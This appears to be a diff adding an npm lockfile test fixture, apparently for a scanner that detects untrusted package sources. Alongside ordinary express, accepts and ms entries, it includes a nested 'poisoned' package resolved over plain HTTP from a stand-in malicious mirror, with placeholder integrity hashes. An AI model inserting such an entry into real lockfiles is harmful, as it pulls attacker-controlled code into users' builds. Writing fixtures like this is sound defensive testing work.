@@ -1,0 +1,33 @@
+{
+  "name": "fixture-npm1",
+  "version": "1.0.0",
+  "lockfileVersion": 1,
+  "requires": true,
+  "dependencies": {
+    "express": {
+      "version": "4.18.2",
+      "resolved": "https://registry.npmjs.org/express/-/express-4.18.2.tgz",
+      "integrity": "sha512-EXAMPLE",
+      "requires": {
+        "accepts": "~1.3.8"
+      },
+      "dependencies": {
+        "accepts": {
+          "version": "1.3.8",
+          "resolved": "https://registry.npmjs.org/accepts/-/accepts-1.3.8.tgz",
+          "integrity": "sha512-EXAMPLE"
+        },
+        "poisoned": {
+          "version": "0.0.1",
+          "resolved": "http://registry.malicious-mirror.example/poisoned/-/poisoned-0.0.1.tgz",
+          "integrity": "sha512-EXAMPLE"
+        }
+      }
+    },
+    "ms": {
+      "version": "2.1.3",
+      "resolved": "https://registry.npmjs.org/ms/-/ms-2.1.3.tgz",
+      "integrity": "sha512-EXAMPLE"
+    }
+  }
+}
